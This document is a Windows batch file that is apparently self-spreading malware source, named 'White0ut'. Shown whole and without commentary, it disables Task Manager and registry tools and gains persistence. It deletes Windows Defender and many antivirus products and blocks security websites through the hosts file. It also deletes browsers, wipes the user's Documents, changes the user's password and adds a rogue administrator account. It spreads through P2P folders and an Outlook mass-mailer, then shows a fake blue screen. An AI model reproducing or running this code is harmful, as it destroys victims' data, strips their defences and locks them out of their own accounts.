@echo off >Nul & Title C:\Windows\system32\White0ut.exe & color f7 & Attrib %0 +H & cls
:: Error Message Followed By An Attribute To Hide It And Its Execution
@echo x=msgbox("component 'comdlg32.ocx' or one of its dependencies not correctly registered: a file is missing or invalid",0+16,"Error Win32 Application") >>C:\Error.vbs
Attrib C:\Error.vbs +H & Start C:\Error.vbs
:: Delete All Registry Editor Tools, Disable Task Manager, & Registry Start-up
reg add hkcu\software\microsoft\windows\currentversion\policies\system /v disableregistrytools /t reg_dword /d "1" /f
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
reg add "hklm\Software\Microsoft\Windows\CurrentVersion\Run" /v "rundll32_awspeGfa_w32" /t "REG_SZ" /d %0 /f > nul
:: Delete Malware Removal Tool, Windows Defender, & Zone-alarm
Attrib "%ProgramFiles%\Windows Defender" -r -s -h
Del "%ProgramFiles%\Windows Defender" /F /S /Q
Attrib -r -s -h C:\Windows\System32\MRT.exe
Del /F /S /Q C:\Windows\System32\MRT.exe
ERASE /F /S /Q C:\Windows\System32\MRT.exe
Taskkill /IM zatray.exe /F
Taskkill /PID 3168 /F
Attrib C:\Program Files\CheckPoint -r -s -h
Attrib C:\Program Files\CheckPoint\*.* -r -s -h
Del C:\Program Files\CheckPoint
Del C:\Program Files\CheckPoint\*.*
Attrib "C:\Users\AnonLoad\AppData\Roaming\Check Point Software Technologies LTD" -r -s -h
Attrib "C:\Users\AnonLoad\AppData\Roaming\Check Point Software Technologies LTD\*.*" -r -s -h
Del "C:\Users\AnonLoad\AppData\Roaming\Check Point Software Technologies LTD"
Del "C:\Users\AnonLoad\AppData\Roaming\Check Point Software Technologies LTD\*.*"
:: Taskill Possible Antivirus(s)
tskill /A av* & tskill /A fire* & tskill /A anti* & tskill /A spy*
tskill /A bullguard & tskill /A PersFw & tskill /A KAV* & tskill /A ZONEALARM
tskill /A SAFEWEB & tskill /A OUTPOST & tskill /A nv* & tskill /A nav*
tskill /A F-* & tskill /A ESAFE & tskill /A cle & tskill /A BLACKICE
tskill /A def* & tskill /A kav & tskill /A kav* & tskill /A avg*
tskill /A ash* & tskill /A aswupdsv & tskill /A ewid* & tskill /A guard*
tskill /A guar* & tskill /A gcasDt* & tskill /A msmp* & tskill /A mcafe*
tskill /A mghtml & tskill /A msiexec & tskill /A outpost & tskill /A isafe
tskill /A zap* & tskill /A zauinst & tskill /A upd* & tskill /A zlclien*
tskill /A minilog & tskill /A cc* & tskill /A norton* & tskill /A norton au*
tskill /A ccc* & tskill /A npfmn* & tskill /A loge* & tskill /A nisum*
tskill /A issvc & tskill /A tmp* & tskill /A tmn* & tskill /A pcc*
tskill /A cpd* & tskill /A pop* & tskill /A pav* & tskill /A padmin
tskill /A panda* & tskill /A avsch* & tskill /A sche* & tskill /A syman*
tskill /A virus* & tskill /A realm* & tskill /A sweep* & tskill /A scan*
tskill /A ad-* & tskill /A safe* & tskill /A avas* & tskill /A norm*
:: Delete Possible Antivirus(s)
del /Q /F C:\Program Files\alwils~1\avast4\*.* 
del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
del /Q /F C:\Program Files\kasper~1\*.exe 
del /Q /F C:\Program Files\trojan~1\*.exe 
del /Q /F C:\Program Files\f-prot95\*.dll 
del /Q /F C:\Program Files\tbav\*.dat 
del /Q /F C:\Program Files\avpersonal\*.vdf 
del /Q /F C:\Program Files\Norton~1\*.cnt 
del /Q /F C:\Program Files\Mcafee\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.* 
del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.* 
del /Q /F C:\Program Files\Norton~1\Norton~1\*.* 
del /Q /F C:\Program Files\Norton~1\*.* 
del /Q /F C:\Program Files\avgamsr\*.exe 
del /Q /F C:\Program Files\avgamsvr\*.exe 
del /Q /F C:\Program Files\avgemc\*.exe
del /Q /F C:\Program Files\avgcc\*.exe 
del /Q /F C:\Program Files\avgupsvc\*.exe
del /Q /F C:\Program Files\grisoft 
del /Q /F C:\Program Files\nood32krn\*.exe 
del /Q /F C:\Program Files\nood32\*.exe 
del /Q /F C:\Program Files\nod32 
del /Q /F C:\Program Files\nood32
del /Q /F C:\Program Files\kav\*.exe 
del /Q /F C:\Program Files\kavmm\*.exe 
del /Q /F C:\Program Files\kaspersky\*.*
del /Q /F C:\Program Files\ewidoctrl\*.exe 
del /Q /F C:\Program Files\guard\*.exe 
del /Q /F C:\Program Files\ewido\*.exe 
del /Q /F C:\Program Files\pavprsrv\*.exe 
del /Q /F C:\Program Files\pavprot\*.exe 
del /Q /F C:\Program Files\avengine\*.exe 
del /Q /F C:\Program Files\apvxdwin\*.exe 
del /Q /F C:\Program Files\webproxy\*.exe 
del /Q /F C:\Program Files\panda software\*.*
:: Block All Major Antiviral Websites
set hosts=%windir%\System32\drivers\etc\hosts
echo. >> %hosts%
echo 127.0.0.1 avast.com >> %hosts%
echo 127.0.0.1 avp.com >> %hosts%
echo 127.0.0.1 avira.com >> %hosts%
echo 127.0.0.1 ca.com >> %hosts%
echo 127.0.0.1 customer.symantec.com >> %hosts%
echo 127.0.0.1 dispatch.mcafee.com >> %hosts%
echo 127.0.0.1 download.mcafee.com >> %hosts%
echo 127.0.0.1 eset.com >> %hosts%
echo 127.0.0.1 f-secure.com >> %hosts%
echo 127.0.0.1 kaspersky.com >> %hosts%
echo 127.0.0.1 kaspersky-labs.com >> %hosts%
echo 127.0.0.1 liveupdate.symantec.com >> %hosts%
echo 127.0.0.1 liveupdate.symantecliveupdate.com >> %hosts%
echo 127.0.0.1 mast.mcafee.com >> %hosts%
echo 127.0.0.1 mcafee.com >> %hosts%
echo 127.0.0.1 microsoft.com >> %hosts%
echo 127.0.0.1 my-etrust.com >> %hosts%
echo 127.0.0.1 nai.com >> %hosts%
echo 127.0.0.1 networkassociates.com >> %hosts%
echo 127.0.0.1 pandasoftware.com >> %hosts%
echo 127.0.0.1 rads.mcafee.com >> %hosts%
echo 127.0.0.1 secure.nai.com >> %hosts%
echo 127.0.0.1 securityresponse.symantec.com >> %hosts%
echo 127.0.0.1 sophos.com >> %hosts%
echo 127.0.0.1 symantec.com >> %hosts%
echo 127.0.0.1 trendmicro.com >> %hosts%
echo 127.0.0.1 updates.symantec.com >> %hosts%
echo 127.0.0.1 update.symantec.com >> %hosts%
echo 127.0.0.1 us.mcafee.com >> %hosts%
echo 127.0.0.1 viruslist.com >> %hosts%
echo 127.0.0.1 virustotal.com >> %hosts%
echo 127.0.0.1 f-secure.com >> %hosts%
echo 127.0.0.1 grisoft.com >> %hosts%
echo 127.0.0.1 kaspersky.com >> %hosts%
echo 127.0.0.1 mcafee.com >> %hosts%
echo 127.0.0.1 microsoft.com >> %hosts%
echo 127.0.0.1 my-etrust.com >> %hosts%
echo 127.0.0.1 nai.com >> %hosts%
echo 127.0.0.1 networkassociates.com >> %hosts%
echo 127.0.0.1 pandasoftware.com >> %hosts%
echo 127.0.0.1 sophos.com >> %hosts%
echo 127.0.0.1 symantec.com >> %hosts%
echo 127.0.0.1 trendmicro.com >> %hosts%
echo 127.0.0.1 safer-networking.org >> %hosts%
echo 127.0.0.1 pandasecurity.com >> %hosts%
echo 127.0.0.1 webroot.com >> %hosts%
echo 127.0.0.1 eset.com >> %hosts%
echo 127.0.0.1 hacksoft.com.pe >> %hosts%
echo 127.0.0.1 bitdefender.com >> %hosts%
echo 127.0.0.1 housecall.trendmicro.com >> %hosts%
echo 127.0.0.1 antivirus.com >> %hosts%
Endlocal & cls
:: Mass Directory Spread
if exist C:\ProgramData\White0ut.exe Attrib C:\ProgramData\White0ut.exe -H -R
if exist C:\PerfLogs\White0ut.exe Attrib C:\PerfLogs\White0ut.exe -H -R
if exist C:\Windows\White0ut.exe Attrib C:\Windows\White0ut.exe -H -R
if exist C:\Users\White0ut.exe Attrib C:\Users\White0ut.exe -H -R
if exist C:\White0ut.exe Attrib C:\White0ut.exe -H -R
if exist C:\~MSSETUP.T\White0ut.exe Attrib C:\~MSSETUP.T\White0ut.exe -H -R
if exist C:\PerfLogs\White0ut.exe Attrib C:\PerfLogs\White0ut.exe -H -R
if exist C:\%user%\White0ut.exe Attrib C:\%user%\White0ut.exe -H -R
if exist C:\Program Files\White0ut.exe Attrib C:\Program Files\White0ut.exe -H -R
if exist C:\Users\%username%\Documents\White0ut.exe Attrib C:\Users\%username%\Documents\White0ut.exe -H -R
if exist C:\Users\%username%\Videos\White0ut.exe Attrib C:\Users\%username%\Videos\White0ut.exe -H -R
if exist C:\Program Files\Common_Files\System\White0ut.exe Attrib C:\Program Files\Common_Files\System\White0ut.exe -H -R
if exist C:\Users\%username%\AppData\Local\Temp\White0ut.exe Attrib C:\Users\%username%\AppData\Local\Temp\White0ut.exe -H -R
if exist C:\Users\%username%\AppData\Roaming\White0ut.exe Attrib C:\Users\%username%\AppData\Roaming\White0ut.exe -H -R
if exist C:\Users\%username%\Downloads\White0ut.exe Attrib C:\Users\%username%\Downloads\White0ut.exe -H -R
if exist C:\Users\%username%\Music\White0ut.exe Attrib C:\Users\%username%\Music\White0ut.exe -H -R
if exist C:\Windows\system32\White0ut.exe Attrib C:\Windows\system32\White0ut.exe -H -R
if exist C:\Program Files\Common Files\White0ut.exe Attrib C:\Program Files\Common Files\White0ut.exe -H -R
if exist C:\Users\%username%\Pictures\White0ut.exe Attrib C:\Users\%username%\Pictures\White0ut.exe -H -R
if exist C:\Users\%username%\Videos\White0ut.exe del C:\Users\%username%\Videos\White0ut.exe
if exist C:\Users\%username%\AppData\Local\Temp\White0ut.exe del C:\Users\%username%\AppData\Local\Temp\White0ut.exe
if exist C:\Program Files\Common_Files\System\LoveDrea.exe del C:\Program Files\Common_Files\System\White0ut.exe
if exist C:\Users\%username%\AppData\Roaming\White0ut.exe del C:\Users\%username%\AppData\Roaming\White0ut.exe
if exist C:\Users\%username%\Downloads\White0ut.exe del C:\Users\%username%\Downloads\White0ut.exe
if exist C:\%user%\White0ut.exe del C:\%user%\White0ut.exe
if exist C:\~MSSETUP.T\White0ut.exe del C:\~MSSETUP.T\White0ut.exe
if exist C:\Users\%username%\Music\White0ut.exe del C:\Users\%username%\Music\White0ut.exe
if exist C:\Windows\system32\White0ut.exe del C:\Windows\system32\White0ut.exe
if exist C:\PerfLogs\White0ut.exe del C:\PerfLogs\White0ut.exe
if exist C:\Program Files\White0ut.exe del C:\Program Files\White0ut.exe
if exist C:\Users\%username%\Documents\White0ut.exe del C:\Users\%username%\Documents\White0ut.exe
if exist C:\Program Files\Common Files\White0ut.exe del C:\Program Files\Common Files\White0ut.exe
if exist C:\Users\%username%\Pictures\White0ut.exe del C:\Users\%username%\Pictures\White0ut.exe
if exist C:\ProgramData\White0ut.exe del C:\ProgramData\White0ut.exe
if exist C:\PerfLogs\White0ut.exe del C:\PerfLogs\White0ut.exe
if exist C:\Windows\White0ut.exe del C:\Windows\White0ut.exe
if exist C:\Users\White0ut.exe del C:\Users\White0ut.exe
if exist C:\White0ut.exe del C:\White0ut.exe
Copy "White0ut.exe" "C:\Users\%username%\Videos"
Copy "White0ut.exe" "C:\PerfLogs"
Copy "White0ut.exe" "C:\ProgramData"
Copy "White0ut.exe" "C:\%user%"
Copy "White0ut.exe" "C:\Users\%username%\Videos"
Copy "White0ut.exe" "C:\Users\%username%\Downloads"
Copy "White0ut.exe" "C:\Users\%username%\Documents"
Copy "White0ut.exe" "C:\Users\%username%\AppData\Roaming"
Copy "White0ut.exe" "C:\Users\%username%\AppData\Local\Temp"
Copy "White0ut.exe" "C:\Program Files\Common_Files\System"
Copy "White0ut.exe" "C:\Users\%username%\Desktop"
Copy "White0ut.exe" "C:\Program Files\Common_Files"
Copy "White0ut.exe" "C:\Program Files"
Copy "White0ut.exe" "C:\Windows\system32"
Copy "White0ut.exe" "C:\Users\%username%\Music"
Copy "White0ut.exe" "C:\Users\%username%\AppData"
Copy "White0ut.exe" "C:\Windows"
Copy "White0ut.exe" "C:\Users\%username%\Pictures"
Copy "White0ut.exe" "C:\"
Copy "White0ut.exe" "C:\Users"
Copy "White0ut.exe" "C:\ProgramData"
Copy "White0ut.exe" "C:\~MSSETUP.T\"
Attrib C:\Users\%username%\Videos\White0ut.exe +H +R
Attrib C:\Users\%username%\Downloads\White0ut.exe +H +R
Attrib C:\Users\%username%\Documents\White0ut.exe +H +R
Attrib C:\Users\%username%\AppData\Roaming\White0ut.exe +H +R
Attrib C:\Users\%username%\AppData\Local\Temp\White0ut.exe +H +R
Attrib C:\Program Files\Common_Files\System\White0ut.exe +H +R
Attrib C:\Users\%username%\Desktop\White0ut.exe +H +R
Attrib C:\ProgramData\White0ut.exe +H +R
Attrib C:\%user%\White0ut.exe +H +R
Attrib C:\~MSSETUP.T\White0ut.exe +H +R
Attrib C:\Program Files\Common_Files\White0ut.exe +H +R
Attrib C:\Program Files\White0ut.exe +H +R
Attrib C:\PerfLogs\White0ut.exe +H +R
Attrib C:\Windows\system32\White0ut.exe +H +R
Attrib C:\Users\%username%\Music\White0ut.exe +H +R
Attrib C:\Users\%username%\AppData\White0ut.exe +H +R
Attrib C:\Windows\White0ut.exe +H +R
Attrib C:\Users\%username%\Pictures\White0ut.exe +H +R
Attrib C:\White0ut.exe +H +R
Attrib C:\Users\White0ut.exe +H +R
Attrib C:\ProgramData\White0ut.exe +H +R
:: Browser: Internet Explorer, Google Chrome, Firefox, Opera
If exist "C:\Program Files\Internet Explorer\iexplore.exe" Goto DelIE
:DelIE
Attrib "C:\Program Files\Internet Explorer\iexplore.exe" -r -s -h
ERASE /F /Q "C:\Program Files\Internet Explorer\iexplore.exe"
If exist "C:\Program Files\Google\Chrome\Application\chrome.exe" Goto DelChrome
:DelChrome
Attrib "C:\Program Files\Google\Chrome\Application\chrome.exe" -r -s -h
ERASE /F /Q "C:\Program Files\Google\Chrome\Application\chrome.exe"
If exist "C:\Program Files\Mozilla Firefox\firefox.exe" Goto DelFirefox
:DelFirefox
Attrib "C:\Program Files\Mozilla Firefox\firefox.exe" -r -s -h
ERASE /F /Q "C:\Program Files\Mozilla Firefox\firefox.exe"
If exist "C:\Program Files\Opera\launcher.exe" Goto DelOpera
:DelOpera
Attrib "C:\Program Files\Opera\launcher.exe" -r -s -h
ERASE /F /Q "C:\Program Files\Opera\launcher.exe"
:: Wipe All User Documents
Mkdir C:\Users\%username%\Documents\Hive & Attrib C:\Users\%username%\Documents\Hive +R +H
xcopy  "C:\Users\%username%\Documents" "C:\Users\%username%\Documents\Hive" /y
del /F /Q /A H S R C "C:\Users\%username%\Documents\Hive"
:: Change Users Password
net user %username% White0ut
:: Create AN Administrator Account
net user White0ut White0ut /add
net localgroup administrators UN /add
:: Send Message To Printer
echo White0ut>> "C:\White0ut.txt"
notepad /P "C:\White0ut.txt"
:: Mail spread: Limewire, Emule, ,Grokster, & Outlook
If exist %ProgramFiles%\limewire\Shared copy %0 %ProgramFiles%\limewire\Shared
If exist %ProgramFiles%\Grokster\My Grokster copy %0 %ProgramFiles%\Grokster\My Grokster
If exist %ProgramFiles%\eMule\Incoming copy %0 %ProgramFiles%\eMule\Incoming
echo dim x>>%SystemDrive%White0ut.vbs
echo on error resume next>>%SystemDrive%\White0ut.vbs
echo Set fso ="Scripting.FileSystem.Object"">>%SystemDrive%\White0ut.vbs
echo Set so=CreateObject(fso)>>%SystemDrive%\White0ut.vbs
echo Set ol=CreateObject("Outlook.Application")>>%SystemDrive%\White0ut.vbs
echo Set out=WScript.CreateObject("Outlook.Application")>>%SystemDrive%\White0ut.vbs
echo Set mapi = out.GetNameSpace("MAPI")>>%SystemDrive%\White0ut.vbs
echo Set a = mapi.AddressLists(1)>>%SystemDrive%\White0ut.vbs
echo Set ae=a.AddressEntries>>%SystemDrive%\White0ut.vbs
echo For x=1 To ae.Count>>%SystemDrive%\White0ut.vbs
echo Set ci=ol.CreateItem(0)>>%SystemDrive%\White0ut.vbs
echo Set Mail=ci>>%SystemDrive%\White0ut.vbs
echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)>>%SystemDrive%\White0ut.vbs
echo Mail.Subject="LoveDream">>%SystemDrive%\White0ut.vbs
echo Mail.Subject="LoveDream">>%SystemDrive%\White0ut.vbs
echo Mail.Body="LoveDream">>%SystemDrive%\White0ut.vbs
echo Mail.Attachments.Add(%0)>>%SystemDrive%\White0ut.vbs
echo Mail.send>>%SystemDrive%\White0ut.vbs
echo Next>>%SystemDrive%\White0ut.vbs
echo ol.Quit>>%SystemDrive%\White0ut.vbs
Attrib White0ut.vbs +H +R & Start White0ut.vbs
:: Kill Explorer
taskill /IM explorer.exe /F 
Tskill explorer.exe
:: HTML BSoD To Confuse User
(
echo ^<html^>^<head^>^<title^>Microsoft Windows^</title^> 
echo. 
echo ^<hta:application id="oBVC" 
echo applicationname="BSOD"  
echo version="1.0" 
echo maximizebutton="no" 
echo minimizebutton="no" 
echo sysmenu="no" 
echo Caption="no" 
echo windowstate="maximize"/^> 
echo. 
echo ^</head^>^<body bgcolor="#000088" scroll="no"^> 
echo ^<font face="Lucida Console" size="4" color="white"^> 
echo ^<p^>A problem has been detected and windows has been shutdown to prevent damage to your computer.^</p^> 
echo. 
echo ^<p^>DRIVER_IRQL_NOT_LES_OR_EQUAL^</p^> 
echo. 
echo ^<p^>If this is the first time you've seen this stop error screen, restart your computer, If this screen appears again, follow these steps:^</p^> 
echo. 
echo ^<p^>Check to make sure any new hardware or software is properly installed. If this is a new installation, ask your hardware or software manufacturer for any windows updates you might need.^</p^> 
echo. 
echo ^<p^>If problems continue, disable or remove any newly installed hardware or software. Disable BIOS memory options such as caching or shadowing. If you need to use Safe Mode to remove or disable components, restart your computer, press F8 to select Advanced Startup Options, and then select Safe Mode.^</p^> 
echo. 
echo ^<p^>Technical information:^</p^> 
echo. 
echo ^<p^>*** STOP: 0x00D1 ^(0x00C,0x002,0x00,0xF86B5A89^)^</p^> 
echo. 
echo. 
echo ^<p^>***  gv3.sys - Address F86B5A89 base at F86B5000, DateStamp 3dd9919eb^</p^> 
echo. 
echo ^<p^>Beginning dump of physical memory^</p^> 
echo ^<p^>Physical memory dump complete.^</p^> 
echo ^<p^>Contact your system administrator or technical support group for further assistance.^</p^> 
echo.
echo. 
echo ^</font^> 
echo ^</body^>
echo.
echo ^<script language="javascript"^>
echo function noClick^(^) {
echo if ^(^(event.button==1^)^|^|^(event.button==2^)^) {
echo alert^('Error: 00101100x00100100 missing keymgr.dll'^)
echo }
echo }
echo document.onmousedown=noClick
echo ^</script^>
echo.  
echo ^</html^> 
) > bsod.hta
Attrib bsod.hta +H
start "" /wait "bsod.hta"
del /f /q "bsod.hta" > nul
@Exit


